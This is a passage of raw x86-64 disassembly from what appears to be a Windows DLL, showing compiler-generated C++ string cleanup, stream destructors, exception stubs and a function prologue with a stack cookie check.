   180004abb:	90                   	nop
   180004abc:	80 7c 24 25 00       	cmpb   $0x0,0x25(%rsp)
   180004ac1:	74 3a                	je     0x180004afd
   180004ac3:	48 8b 95 c8 02 00 00 	mov    0x2c8(%rbp),%rdx
   180004aca:	48 ff c2             	inc    %rdx
   180004acd:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   180004ad2:	48 8b c1             	mov    %rcx,%rax
   180004ad5:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004adc:	72 19                	jb     0x180004af7
   180004ade:	48 83 c2 27          	add    $0x27,%rdx
   180004ae2:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180004ae6:	48 2b c1             	sub    %rcx,%rax
   180004ae9:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004aed:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004af1:	0f 87 93 04 00 00    	ja     0x180004f8a
   180004af7:	e8 90 7d 00 00       	call   0x18000c88c
   180004afc:	90                   	nop
   180004afd:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   180004b02:	74 38                	je     0x180004b3c
   180004b04:	48 8b 95 78 01 00 00 	mov    0x178(%rbp),%rdx
   180004b0b:	48 ff c2             	inc    %rdx
   180004b0e:	49 8b c6             	mov    %r14,%rax
   180004b11:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004b18:	72 19                	jb     0x180004b33
   180004b1a:	48 83 c2 27          	add    $0x27,%rdx
   180004b1e:	4d 8b 76 f8          	mov    -0x8(%r14),%r14
   180004b22:	49 2b c6             	sub    %r14,%rax
   180004b25:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004b29:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004b2d:	0f 87 5d 04 00 00    	ja     0x180004f90
   180004b33:	49 8b ce             	mov    %r14,%rcx
   180004b36:	e8 51 7d 00 00       	call   0x18000c88c
   180004b3b:	90                   	nop
   180004b3c:	80 7c 24 21 00       	cmpb   $0x0,0x21(%rsp)
   180004b41:	74 38                	je     0x180004b7b
   180004b43:	48 8b 95 48 01 00 00 	mov    0x148(%rbp),%rdx
   180004b4a:	48 ff c2             	inc    %rdx
   180004b4d:	49 8b c7             	mov    %r15,%rax
   180004b50:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004b57:	72 19                	jb     0x180004b72
   180004b59:	48 83 c2 27          	add    $0x27,%rdx
   180004b5d:	4d 8b 7f f8          	mov    -0x8(%r15),%r15
   180004b61:	49 2b c7             	sub    %r15,%rax
   180004b64:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004b68:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004b6c:	0f 87 24 04 00 00    	ja     0x180004f96
   180004b72:	49 8b cf             	mov    %r15,%rcx
   180004b75:	e8 12 7d 00 00       	call   0x18000c88c
   180004b7a:	90                   	nop
   180004b7b:	80 7c 24 22 00       	cmpb   $0x0,0x22(%rsp)
   180004b80:	74 38                	je     0x180004bba
   180004b82:	48 8b 95 28 01 00 00 	mov    0x128(%rbp),%rdx
   180004b89:	48 ff c2             	inc    %rdx
   180004b8c:	48 8b c7             	mov    %rdi,%rax
   180004b8f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004b96:	72 19                	jb     0x180004bb1
   180004b98:	48 83 c2 27          	add    $0x27,%rdx
   180004b9c:	48 8b 7f f8          	mov    -0x8(%rdi),%rdi
   180004ba0:	48 2b c7             	sub    %rdi,%rax
   180004ba3:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004ba7:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004bab:	0f 87 eb 03 00 00    	ja     0x180004f9c
   180004bb1:	48 8b cf             	mov    %rdi,%rcx
   180004bb4:	e8 d3 7c 00 00       	call   0x18000c88c
   180004bb9:	90                   	nop
   180004bba:	80 7c 24 23 00       	cmpb   $0x0,0x23(%rsp)
   180004bbf:	74 37                	je     0x180004bf8
   180004bc1:	48 8b 95 08 01 00 00 	mov    0x108(%rbp),%rdx
   180004bc8:	48 ff c2             	inc    %rdx
   180004bcb:	48 8b c6             	mov    %rsi,%rax
   180004bce:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004bd5:	72 19                	jb     0x180004bf0
   180004bd7:	48 83 c2 27          	add    $0x27,%rdx
   180004bdb:	48 8b 76 f8          	mov    -0x8(%rsi),%rsi
   180004bdf:	48 2b c6             	sub    %rsi,%rax
   180004be2:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004be6:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004bea:	0f 87 b2 03 00 00    	ja     0x180004fa2
   180004bf0:	48 8b ce             	mov    %rsi,%rcx
   180004bf3:	e8 94 7c 00 00       	call   0x18000c88c
   180004bf8:	48 83 c3 10          	add    $0x10,%rbx
   180004bfc:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   180004c01:	48 3b 58 08          	cmp    0x8(%rax),%rbx
   180004c05:	74 0d                	je     0x180004c14
   180004c07:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   180004c0c:	45 33 ed             	xor    %r13d,%r13d
   180004c0f:	e9 21 f6 ff ff       	jmp    0x180004235
   180004c14:	8b 44 24 48          	mov    0x48(%rsp),%eax
   180004c18:	85 c0                	test   %eax,%eax
   180004c1a:	0f 8e 5b 01 00 00    	jle    0x180004d7b
   180004c20:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   180004c24:	89 01                	mov    %eax,(%rcx)
   180004c26:	48 8b 95 e8 00 00 00 	mov    0xe8(%rbp),%rdx
   180004c2d:	48 83 fa 10          	cmp    $0x10,%rdx
   180004c31:	72 34                	jb     0x180004c67
   180004c33:	48 ff c2             	inc    %rdx
   180004c36:	48 8b 8d d0 00 00 00 	mov    0xd0(%rbp),%rcx
   180004c3d:	48 8b c1             	mov    %rcx,%rax
   180004c40:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004c47:	72 19                	jb     0x180004c62
   180004c49:	48 83 c2 27          	add    $0x27,%rdx
   180004c4d:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180004c51:	48 2b c1             	sub    %rcx,%rax
   180004c54:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004c58:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004c5c:	0f 87 ca 03 00 00    	ja     0x18000502c
   180004c62:	e8 25 7c 00 00       	call   0x18000c88c
   180004c67:	33 ff                	xor    %edi,%edi
   180004c69:	48 89 bd e0 00 00 00 	mov    %rdi,0xe0(%rbp)
   180004c70:	48 c7 85 e8 00 00 00 	movq   $0xf,0xe8(%rbp)
   180004c77:	0f 00 00 00 
   180004c7b:	40 88 bd d0 00 00 00 	mov    %dil,0xd0(%rbp)
   180004c82:	48 8d 8d 50 01 00 00 	lea    0x150(%rbp),%rcx
   180004c89:	e8 e2 df ff ff       	call   0x180002c70
   180004c8e:	90                   	nop
   180004c8f:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180004c96:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180004c9a:	48 8d 05 6f e5 03 00 	lea    0x3e56f(%rip),%rax        # 0x180043210
   180004ca1:	48 89 84 0d a0 01 00 	mov    %rax,0x1a0(%rbp,%rcx,1)
   180004ca8:	00 
   180004ca9:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180004cb0:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180004cb4:	8d 91 50 ff ff ff    	lea    -0xb0(%rcx),%edx
   180004cba:	89 94 0d 9c 01 00 00 	mov    %edx,0x19c(%rbp,%rcx,1)
   180004cc1:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180004cc8:	e8 63 28 00 00       	call   0x180007530
   180004ccd:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180004cd4:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180004cd8:	48 8d 05 f9 e4 03 00 	lea    0x3e4f9(%rip),%rax        # 0x1800431d8
   180004cdf:	48 89 84 0d a0 01 00 	mov    %rax,0x1a0(%rbp,%rcx,1)
   180004ce6:	00 
   180004ce7:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180004cee:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180004cf2:	8d 51 e8             	lea    -0x18(%rcx),%edx
   180004cf5:	89 94 0d 9c 01 00 00 	mov    %edx,0x19c(%rbp,%rcx,1)
   180004cfc:	48 8d 05 1d fa 02 00 	lea    0x2fa1d(%rip),%rax        # 0x180034720
   180004d03:	48 89 85 50 02 00 00 	mov    %rax,0x250(%rbp)
   180004d0a:	48 8d 8d 50 02 00 00 	lea    0x250(%rbp),%rcx
   180004d11:	e8 16 8f 00 00       	call   0x18000dc2c
   180004d16:	90                   	nop
   180004d17:	48 8d 8d d0 02 00 00 	lea    0x2d0(%rbp),%rcx
   180004d1e:	e8 1d 03 00 00       	call   0x180005040
   180004d23:	90                   	nop
   180004d24:	48 8b 5d 98          	mov    -0x68(%rbp),%rbx
   180004d28:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   180004d2c:	48 83 fa 10          	cmp    $0x10,%rdx
   180004d30:	72 30                	jb     0x180004d62
   180004d32:	48 ff c2             	inc    %rdx
   180004d35:	48 8b 0b             	mov    (%rbx),%rcx
   180004d38:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004d3f:	72 1c                	jb     0x180004d5d
   180004d41:	48 83 c2 27          	add    $0x27,%rdx
   180004d45:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180004d49:	49 2b c8             	sub    %r8,%rcx
   180004d4c:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180004d50:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004d54:	0f 87 9a 01 00 00    	ja     0x180004ef4
   180004d5a:	49 8b c8             	mov    %r8,%rcx
   180004d5d:	e8 2a 7b 00 00       	call   0x18000c88c
   180004d62:	48 89 7b 10          	mov    %rdi,0x10(%rbx)
   180004d66:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   180004d6d:	00 
   180004d6e:	c6 03 00             	movb   $0x0,(%rbx)
   180004d71:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180004d76:	e9 cc f3 ff ff       	jmp    0x180004147
   180004d7b:	4c 8b 75 98          	mov    -0x68(%rbp),%r14
   180004d7f:	45 33 ed             	xor    %r13d,%r13d
   180004d82:	49 8b d6             	mov    %r14,%rdx
   180004d85:	49 83 7e 18 10       	cmpq   $0x10,0x18(%r14)
   180004d8a:	72 03                	jb     0x180004d8f
   180004d8c:	49 8b 16             	mov    (%r14),%rdx
   180004d8f:	48 8d 0d e2 e0 03 00 	lea    0x3e0e2(%rip),%rcx        # 0x180042e78
   180004d96:	e8 b5 d0 ff ff       	call   0x180001e50
   180004d9b:	90                   	nop
   180004d9c:	48 8b 95 e8 00 00 00 	mov    0xe8(%rbp),%rdx
   180004da3:	48 83 fa 10          	cmp    $0x10,%rdx
   180004da7:	72 34                	jb     0x180004ddd
   180004da9:	48 ff c2             	inc    %rdx
   180004dac:	48 8b 8d d0 00 00 00 	mov    0xd0(%rbp),%rcx
   180004db3:	48 8b c1             	mov    %rcx,%rax
   180004db6:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004dbd:	72 19                	jb     0x180004dd8
   180004dbf:	48 83 c2 27          	add    $0x27,%rdx
   180004dc3:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180004dc7:	48 2b c1             	sub    %rcx,%rax
   180004dca:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004dce:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004dd2:	0f 87 54 02 00 00    	ja     0x18000502c
   180004dd8:	e8 af 7a 00 00       	call   0x18000c88c
   180004ddd:	4c 89 ad e0 00 00 00 	mov    %r13,0xe0(%rbp)
   180004de4:	48 c7 85 e8 00 00 00 	movq   $0xf,0xe8(%rbp)
   180004deb:	0f 00 00 00 
   180004def:	c6 85 d0 00 00 00 00 	movb   $0x0,0xd0(%rbp)
   180004df6:	48 8d 8d 50 01 00 00 	lea    0x150(%rbp),%rcx
   180004dfd:	e8 6e de ff ff       	call   0x180002c70
   180004e02:	90                   	nop
   180004e03:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180004e0a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180004e0e:	48 8d 05 fb e3 03 00 	lea    0x3e3fb(%rip),%rax        # 0x180043210
   180004e15:	48 89 84 0d a0 01 00 	mov    %rax,0x1a0(%rbp,%rcx,1)
   180004e1c:	00 
   180004e1d:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180004e24:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180004e28:	8d 91 50 ff ff ff    	lea    -0xb0(%rcx),%edx
   180004e2e:	89 94 0d 9c 01 00 00 	mov    %edx,0x19c(%rbp,%rcx,1)
   180004e35:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180004e3c:	e8 ef 26 00 00       	call   0x180007530
   180004e41:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180004e48:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180004e4c:	48 8d 05 85 e3 03 00 	lea    0x3e385(%rip),%rax        # 0x1800431d8
   180004e53:	48 89 84 0d a0 01 00 	mov    %rax,0x1a0(%rbp,%rcx,1)
   180004e5a:	00 
   180004e5b:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180004e62:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180004e66:	8d 51 e8             	lea    -0x18(%rcx),%edx
   180004e69:	89 94 0d 9c 01 00 00 	mov    %edx,0x19c(%rbp,%rcx,1)
   180004e70:	48 8d 05 a9 f8 02 00 	lea    0x2f8a9(%rip),%rax        # 0x180034720
   180004e77:	48 89 85 50 02 00 00 	mov    %rax,0x250(%rbp)
   180004e7e:	48 8d 8d 50 02 00 00 	lea    0x250(%rbp),%rcx
   180004e85:	e8 a2 8d 00 00       	call   0x18000dc2c
   180004e8a:	90                   	nop
   180004e8b:	48 8d 8d d0 02 00 00 	lea    0x2d0(%rbp),%rcx
   180004e92:	e8 a9 01 00 00       	call   0x180005040
   180004e97:	90                   	nop
   180004e98:	49 8b 56 18          	mov    0x18(%r14),%rdx
   180004e9c:	48 83 fa 10          	cmp    $0x10,%rdx
   180004ea0:	0f 82 8f f2 ff ff    	jb     0x180004135
   180004ea6:	48 ff c2             	inc    %rdx
   180004ea9:	49 8b 0e             	mov    (%r14),%rcx
   180004eac:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004eb3:	0f 82 77 f2 ff ff    	jb     0x180004130
   180004eb9:	48 83 c2 27          	add    $0x27,%rdx
   180004ebd:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180004ec1:	49 2b c8             	sub    %r8,%rcx
   180004ec4:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180004ec8:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004ecc:	77 26                	ja     0x180004ef4
   180004ece:	e9 5a f2 ff ff       	jmp    0x18000412d
   180004ed3:	48 8d 15 e6 dc 03 00 	lea    0x3dce6(%rip),%rdx        # 0x180042bc0
   180004eda:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180004ede:	e8 fd d1 ff ff       	call   0x1800020e0
   180004ee3:	48 8d 15 86 2a 04 00 	lea    0x42a86(%rip),%rdx        # 0x180047970
   180004eea:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180004eee:	e8 41 a7 00 00       	call   0x18000f634
   180004ef3:	90                   	nop
   180004ef4:	e8 87 5c 01 00       	call   0x18001ab80
   180004ef9:	90                   	nop
   180004efa:	48 8d 15 0f dd 03 00 	lea    0x3dd0f(%rip),%rdx        # 0x180042c10
   180004f01:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180004f05:	e8 d6 d1 ff ff       	call   0x1800020e0
   180004f0a:	48 8d 15 5f 2a 04 00 	lea    0x42a5f(%rip),%rdx        # 0x180047970
   180004f11:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180004f15:	e8 1a a7 00 00       	call   0x18000f634
   180004f1a:	90                   	nop
   180004f1b:	e8 60 5c 01 00       	call   0x18001ab80
   180004f20:	cc                   	int3
   180004f21:	e8 fa d0 ff ff       	call   0x180002020
   180004f26:	cc                   	int3
   180004f27:	e8 54 5c 01 00       	call   0x18001ab80
   180004f2c:	90                   	nop
   180004f2d:	e8 4e 5c 01 00       	call   0x18001ab80
   180004f32:	90                   	nop
   180004f33:	e8 48 5c 01 00       	call   0x18001ab80
   180004f38:	90                   	nop
   180004f39:	e8 42 5c 01 00       	call   0x18001ab80
   180004f3e:	90                   	nop
   180004f3f:	e8 3c 5c 01 00       	call   0x18001ab80
   180004f44:	90                   	nop
   180004f45:	e8 36 5c 01 00       	call   0x18001ab80
   180004f4a:	90                   	nop
   180004f4b:	e8 30 5c 01 00       	call   0x18001ab80
   180004f50:	90                   	nop
   180004f51:	e8 2a 5c 01 00       	call   0x18001ab80
   180004f56:	90                   	nop
   180004f57:	e8 24 5c 01 00       	call   0x18001ab80
   180004f5c:	cc                   	int3
   180004f5d:	e8 1e 5c 01 00       	call   0x18001ab80
   180004f62:	90                   	nop
   180004f63:	48 8d 15 06 dc 03 00 	lea    0x3dc06(%rip),%rdx        # 0x180042b70
   180004f6a:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   180004f6e:	e8 6d d1 ff ff       	call   0x1800020e0
   180004f73:	48 8d 15 f6 29 04 00 	lea    0x429f6(%rip),%rdx        # 0x180047970
   180004f7a:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   180004f7e:	e8 b1 a6 00 00       	call   0x18000f634
   180004f83:	90                   	nop
   180004f84:	e8 f7 5b 01 00       	call   0x18001ab80
   180004f89:	90                   	nop
   180004f8a:	e8 f1 5b 01 00       	call   0x18001ab80
   180004f8f:	90                   	nop
   180004f90:	e8 eb 5b 01 00       	call   0x18001ab80
   180004f95:	90                   	nop
   180004f96:	e8 e5 5b 01 00       	call   0x18001ab80
   180004f9b:	90                   	nop
   180004f9c:	e8 df 5b 01 00       	call   0x18001ab80
   180004fa1:	90                   	nop
   180004fa2:	e8 d9 5b 01 00       	call   0x18001ab80
   180004fa7:	90                   	nop
   180004fa8:	48 8d 15 c1 db 03 00 	lea    0x3dbc1(%rip),%rdx        # 0x180042b70
   180004faf:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   180004fb3:	e8 28 d1 ff ff       	call   0x1800020e0
   180004fb8:	48 8d 15 b1 29 04 00 	lea    0x429b1(%rip),%rdx        # 0x180047970
   180004fbf:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   180004fc3:	e8 6c a6 00 00       	call   0x18000f634
   180004fc8:	90                   	nop
   180004fc9:	48 8d 15 a0 db 03 00 	lea    0x3dba0(%rip),%rdx        # 0x180042b70
   180004fd0:	48 8d 4d 38          	lea    0x38(%rbp),%rcx
   180004fd4:	e8 07 d1 ff ff       	call   0x1800020e0
   180004fd9:	48 8d 15 90 29 04 00 	lea    0x42990(%rip),%rdx        # 0x180047970
   180004fe0:	48 8d 4d 38          	lea    0x38(%rbp),%rcx
   180004fe4:	e8 4b a6 00 00       	call   0x18000f634
   180004fe9:	90                   	nop
   180004fea:	48 8d 15 7f db 03 00 	lea    0x3db7f(%rip),%rdx        # 0x180042b70
   180004ff1:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180004ff5:	e8 e6 d0 ff ff       	call   0x1800020e0
   180004ffa:	48 8d 15 6f 29 04 00 	lea    0x4296f(%rip),%rdx        # 0x180047970
   180005001:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180005005:	e8 2a a6 00 00       	call   0x18000f634
   18000500a:	90                   	nop
   18000500b:	48 8d 15 fe db 03 00 	lea    0x3dbfe(%rip),%rdx        # 0x180042c10
   180005012:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180005016:	e8 c5 d0 ff ff       	call   0x1800020e0
   18000501b:	48 8d 15 4e 29 04 00 	lea    0x4294e(%rip),%rdx        # 0x180047970
   180005022:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180005026:	e8 09 a6 00 00       	call   0x18000f634
   18000502b:	90                   	nop
   18000502c:	e8 4f 5b 01 00       	call   0x18001ab80
   180005031:	cc                   	int3
   180005032:	cc                   	int3
   180005033:	cc                   	int3
   180005034:	cc                   	int3
   180005035:	cc                   	int3
   180005036:	cc                   	int3
   180005037:	cc                   	int3
   180005038:	cc                   	int3
   180005039:	cc                   	int3
   18000503a:	cc                   	int3
   18000503b:	cc                   	int3
   18000503c:	cc                   	int3
   18000503d:	cc                   	int3
   18000503e:	cc                   	int3
   18000503f:	cc                   	int3
   180005040:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005045:	57                   	push   %rdi
   180005046:	48 83 ec 20          	sub    $0x20,%rsp
   18000504a:	48 8d b9 98 00 00 00 	lea    0x98(%rcx),%rdi
   180005051:	48 8b 87 68 ff ff ff 	mov    -0x98(%rdi),%rax
   180005058:	48 63 48 04          	movslq 0x4(%rax),%rcx
   18000505c:	48 8d 05 5d e1 03 00 	lea    0x3e15d(%rip),%rax        # 0x1800431c0
   180005063:	48 89 84 39 68 ff ff 	mov    %rax,-0x98(%rcx,%rdi,1)
   18000506a:	ff 
   18000506b:	48 8b 87 68 ff ff ff 	mov    -0x98(%rdi),%rax
   180005072:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180005076:	8d 91 68 ff ff ff    	lea    -0x98(%rcx),%edx
   18000507c:	89 94 39 64 ff ff ff 	mov    %edx,-0x9c(%rcx,%rdi,1)
   180005083:	48 8d 4f 80          	lea    -0x80(%rdi),%rcx
   180005087:	e8 74 2a 00 00       	call   0x180007b00
   18000508c:	48 8b 87 68 ff ff ff 	mov    -0x98(%rdi),%rax
   180005093:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180005097:	48 8d 05 92 e0 03 00 	lea    0x3e092(%rip),%rax        # 0x180043130
   18000509e:	48 89 84 39 68 ff ff 	mov    %rax,-0x98(%rcx,%rdi,1)
   1800050a5:	ff 
   1800050a6:	48 8b 87 68 ff ff ff 	mov    -0x98(%rdi),%rax
   1800050ad:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800050b1:	8d 51 e0             	lea    -0x20(%rcx),%edx
   1800050b4:	89 94 39 64 ff ff ff 	mov    %edx,-0x9c(%rcx,%rdi,1)
   1800050bb:	48 8b 87 78 ff ff ff 	mov    -0x88(%rdi),%rax
   1800050c2:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800050c6:	48 8d 05 73 f7 02 00 	lea    0x2f773(%rip),%rax        # 0x180034840
   1800050cd:	48 89 84 39 78 ff ff 	mov    %rax,-0x88(%rcx,%rdi,1)
   1800050d4:	ff 
   1800050d5:	48 8b 87 78 ff ff ff 	mov    -0x88(%rdi),%rax
   1800050dc:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800050e0:	8d 51 f0             	lea    -0x10(%rcx),%edx
   1800050e3:	89 94 39 74 ff ff ff 	mov    %edx,-0x8c(%rcx,%rdi,1)
   1800050ea:	48 8b 87 68 ff ff ff 	mov    -0x98(%rdi),%rax
   1800050f1:	48 63 50 04          	movslq 0x4(%rax),%rdx
   1800050f5:	48 8d 05 dc e0 03 00 	lea    0x3e0dc(%rip),%rax        # 0x1800431d8
   1800050fc:	48 89 84 3a 68 ff ff 	mov    %rax,-0x98(%rdx,%rdi,1)
   180005103:	ff 
   180005104:	48 8b 87 68 ff ff ff 	mov    -0x98(%rdi),%rax
   18000510b:	48 63 50 04          	movslq 0x4(%rax),%rdx
   18000510f:	44 8d 42 e8          	lea    -0x18(%rdx),%r8d
   180005113:	44 89 84 3a 64 ff ff 	mov    %r8d,-0x9c(%rdx,%rdi,1)
   18000511a:	ff 
   18000511b:	48 8d 05 fe f5 02 00 	lea    0x2f5fe(%rip),%rax        # 0x180034720
   180005122:	48 89 07             	mov    %rax,(%rdi)
   180005125:	48 8b cf             	mov    %rdi,%rcx
   180005128:	e8 ff 8a 00 00       	call   0x18000dc2c
   18000512d:	90                   	nop
   18000512e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005133:	48 83 c4 20          	add    $0x20,%rsp
   180005137:	5f                   	pop    %rdi
   180005138:	c3                   	ret
   180005139:	cc                   	int3
   18000513a:	cc                   	int3
   18000513b:	cc                   	int3
   18000513c:	cc                   	int3
   18000513d:	cc                   	int3
   18000513e:	cc                   	int3
   18000513f:	cc                   	int3
   180005140:	40 53                	rex push %rbx
   180005142:	48 83 ec 20          	sub    $0x20,%rsp
   180005146:	48 8d 99 b0 00 00 00 	lea    0xb0(%rcx),%rbx
   18000514d:	48 8b 83 50 ff ff ff 	mov    -0xb0(%rbx),%rax
   180005154:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180005158:	48 8d 05 b1 e0 03 00 	lea    0x3e0b1(%rip),%rax        # 0x180043210
   18000515f:	48 89 84 19 50 ff ff 	mov    %rax,-0xb0(%rcx,%rbx,1)
   180005166:	ff 
   180005167:	48 8b 83 50 ff ff ff 	mov    -0xb0(%rbx),%rax
   18000516e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   180005172:	8d 91 50 ff ff ff    	lea    -0xb0(%rcx),%edx
   180005178:	89 94 19 4c ff ff ff 	mov    %edx,-0xb4(%rcx,%rbx,1)
   18000517f:	48 8d 8b 60 ff ff ff 	lea    -0xa0(%rbx),%rcx
   180005186:	e8 a5 23 00 00       	call   0x180007530
   18000518b:	48 8b 83 50 ff ff ff 	mov    -0xb0(%rbx),%rax
   180005192:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180005196:	48 8d 05 3b e0 03 00 	lea    0x3e03b(%rip),%rax        # 0x1800431d8
   18000519d:	48 89 84 1a 50 ff ff 	mov    %rax,-0xb0(%rdx,%rbx,1)
   1800051a4:	ff 
   1800051a5:	48 8b 83 50 ff ff ff 	mov    -0xb0(%rbx),%rax
   1800051ac:	48 63 50 04          	movslq 0x4(%rax),%rdx
   1800051b0:	44 8d 42 e8          	lea    -0x18(%rdx),%r8d
   1800051b4:	44 89 84 1a 4c ff ff 	mov    %r8d,-0xb4(%rdx,%rbx,1)
   1800051bb:	ff 
   1800051bc:	48 8d 05 5d f5 02 00 	lea    0x2f55d(%rip),%rax        # 0x180034720
   1800051c3:	48 89 03             	mov    %rax,(%rbx)
   1800051c6:	48 8b cb             	mov    %rbx,%rcx
   1800051c9:	e8 5e 8a 00 00       	call   0x18000dc2c
   1800051ce:	90                   	nop
   1800051cf:	48 83 c4 20          	add    $0x20,%rsp
   1800051d3:	5b                   	pop    %rbx
   1800051d4:	c3                   	ret
   1800051d5:	cc                   	int3
   1800051d6:	cc                   	int3
   1800051d7:	cc                   	int3
   1800051d8:	cc                   	int3
   1800051d9:	cc                   	int3
   1800051da:	cc                   	int3
   1800051db:	cc                   	int3
   1800051dc:	cc                   	int3
   1800051dd:	cc                   	int3
   1800051de:	cc                   	int3
   1800051df:	cc                   	int3
   1800051e0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800051e5:	55                   	push   %rbp
   1800051e6:	56                   	push   %rsi
   1800051e7:	57                   	push   %rdi
   1800051e8:	41 54                	push   %r12
   1800051ea:	41 55                	push   %r13
   1800051ec:	41 56                	push   %r14
   1800051ee:	41 57                	push   %r15
   1800051f0:	48 8d ac 24 50 ff ff 	lea    -0xb0(%rsp),%rbp
   1800051f7:	ff 
   1800051f8:	48 81 ec b0 01 00 00 	sub    $0x1b0,%rsp
   1800051ff:	48 8b 05 0a 3e 04 00 	mov    0x43e0a(%rip),%rax        # 0x180049010
   180005206:	48 33 c4             	xor    %rsp,%rax
   180005209:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   180005210:	4c 8b fa             	mov    %rdx,%r15
   180005213:	48 89 54 24 68       	mov    %rdx,0x68(%rsp)
   180005218:	48 8b f9             	mov    %rcx,%rdi
   18000521b:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   180005220:	48 89 4d 00          	mov    %rcx,0x0(%rbp)
   180005224:	45 33 ed             	xor    %r13d,%r13d
   180005227:	45 8b e5             	mov    %r13d,%r12d
   18000522a:	44 89 6c 24 34       	mov    %r13d,0x34(%rsp)
   18000522f:	41 be 01 00 00 00    	mov    $0x1,%r14d
   180005235:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   18000523a:	44 89 2a             	mov    %r13d,(%rdx)
   18000523d:	41 8d 4d 20          	lea    0x20(%r13),%ecx
   180005241:	e8 b2 59 01 00       	call   0x18001abf8
   180005246:	48 8b f0             	mov    %rax,%rsi
   180005249:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   18000524e:	48 83 7f 18 10       	cmpq   $0x10,0x18(%rdi)
   180005253:	72 0c                	jb     0x180005261
   180005255:	48 8b 17             	mov    (%rdi),%rdx
   180005258:	4c 8b c2             	mov    %rdx,%r8
   18000525b:	4c 03 47 10          	add    0x10(%rdi),%r8
   18000525f:	eb 0a                	jmp    0x18000526b
   180005261:	4c 8b 47 10          	mov    0x10(%rdi),%r8
   180005265:	4c 03 c7             	add    %rdi,%r8
   180005268:	48 8b d7             	mov    %rdi,%rdx
   18000526b:	4c 89 6d 08          	mov    %r13,0x8(%rbp)
   18000526f:	4c 89 6d 18          	mov    %r13,0x18(%rbp)
   180005273:	b8 0f 00 00 00       	mov    $0xf,%eax
